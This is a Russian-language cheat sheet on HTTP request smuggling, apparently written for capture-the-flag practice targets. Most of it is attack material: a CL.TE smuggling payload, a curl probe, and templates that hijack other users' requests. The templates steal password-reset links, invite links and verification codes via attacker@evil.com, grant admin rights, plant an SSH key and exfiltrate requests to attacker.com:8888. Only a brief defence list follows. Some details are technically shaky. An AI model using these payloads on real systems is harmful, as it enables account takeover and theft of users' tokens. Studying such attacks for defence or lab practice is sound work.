# HTTP REQUEST SMUGGLING — CHEATSHEET


## Суть атаки

Frontend и Backend по-разному определяют границы HTTP-запросов. Один запрос превращается в два. Это позволяет атакующему внедрить свои данные в запрос другого пользователя.


## Типы атак

| Тип | Frontend смотрит на | Backend смотрит на |
|-----|---------------------|---------------------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | Обход через дублирование/обфускацию заголовка |


## Техническая суть атаки CL.TE

**Transfer-Encoding: chunked** — тело разбивается на части (чанки).  
Каждый чанк: `[размер в HEX]\r\n[данные]\r\n`  
Чанк размером `0\r\n\r\n` означает **КОНЕЦ ТЕЛА**.

**Что происходит в атаке CL.TE:**

1. Frontend (например, ATS) смотрит на `Content-Length` — читает ровно X байт
2. Backend (например, Nginx) смотрит на `Transfer-Encoding` — видит `0\r\n\r\n` и думает, что запрос закончился раньше
3. Остаток данных (`POST /endpoint.php...`) backend воспринимает как **СЛЕДУЮЩИЙ ЗАПРОС** в очереди (pipelining)
4. Когда приходит реальный запрос другого пользователя, backend "приклеивает" его к отложенному запросу

**Итог:** Один HTTP-запрос от атакующего + один запрос от другого пользователя = два запроса в глазах backend, но frontend видел только один.


## Payload (CL.TE)

```http
POST / HTTP/1.1
Host: target.thm
Content-Length: [ТОЧНАЯ_ДЛИНА_ТЕЛА_ОТ_0_ДО_МУСОРНЫЙ_ПАРАМЕТР=]
Transfer-Encoding: chunked

0

POST /[ВАЖНЫЙ_ЭНДПОИНТ] HTTP/1.1
Host: target.thm
Content-Length: 500

полезный_параметр=attacker@evil.com&мусорный_параметр=
```


## Ключевой момент

- **Полезный параметр** (`email=attacker@evil.com`) — туда подставятся твои данные
- **Мусорный параметр** (`comment=`) — туда придет запрос следующего пользователя

Когда другой пользователь отправит, например:

```
GET /user?token=secret HTTP/1.1
```

Сервер склеит:

```
полезный_параметр=attacker@evil.com
мусорный_параметр=GET /user?token=secret HTTP/1.1
```

Результат:

- Приложение обработает полезный параметр (отправит письмо на твою почту)
- Приложение обработает заголовки другого пользователя в твоем запросе
- Мусорный параметр проигнорируется или сохранится в логах
- Ты получаешь приглашение/ссылку/токен на свою почту


## Примеры smart-атак

### 1. Приглашение пользователя

```http
POST /api/invite
email=attacker@evil.com&debug=
```

→ Приглашение уходит на почту атакующего

### 2. Сброс пароля

```http
POST /api/reset
email=attacker@evil.com&token=
```

→ Ссылка на сброс пароля приходит атакующему

### 3. Подтверждение email

```http
POST /api/verify
email=attacker@evil.com&code=
```

→ Код подтверждения уходит на почту атакующего

### 4. Изменение прав

```http
POST /admin/user/edit
user=attacker&role=admin&log=
```

→ Атакующий получает права администратора

### 5. Добавление SSH-ключа

```http
POST /api/ssh
key=ssh-rsa AAAAB3NzaC1yc2... attacker@evil&comment=
```

→ SSH-ключ атакующего добавляется на сервер

### 6. Создание API-токена

```http
POST /api/token
name=attacker&description=
```

→ Токен создается, атакующий может его использовать

### 7. Отправка сообщения админу

```http
POST /api/message
to=admin&text=approve+my+request&debug=
```

→ Админ получает сообщение с просьбой одобрить действие

### 8. SSRF на свой сервер

```http
POST /api/fetch
url=http://attacker.com:8888/?data=&callback=
```

→ Запрос другого пользователя приходит на твой сервер
---

## Как считать Content-Length

**Первый Content-Length** считаем **ТОЛЬКО по своим данным**. Данные другого пользователя НЕ входят в подсчет.

**Второй Content-Length** (500) — ставим с запасом, чтобы хватило для любых данных другого пользователя.


## Пример для CL.TE

```http
POST /api/invite HTTP/1.1
Host: target.thm
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&debug=
```


## Важно

- Полезный параметр — туда ставишь свои данные (свою почту, свой юзернейм)
- Мусорный параметр — оставляешь пустым, туда придет запрос другого юзера
- Приложение обработает полезный параметр, мусорный проигнорирует
- Результат: ты получаешь приглашение/ссылку/токен на свою почту
- `0\r\n\r\n` — маркер конца chunked-трансфера для backend
- Frontend игнорирует chunked, т.к. ориентируется на Content-Length


## Как проверить уязвимость

```bash
# Отправить тестовый запрос
curl -v -H "Host: target.thm" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 100" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.thm\r\n\r\n" \
  http://target.thm/

# Если в ответе появится /admin — уязвимость есть
```


## Защита

- Использовать HTTP/2 (устойчив к smuggling)
- Настроить frontend и backend на одинаковое поведение
- Отключить pipelining
- Использовать WAF с детектированием smuggling-паттернов
- Обновить прокси (nginx, HAProxy, Envoy)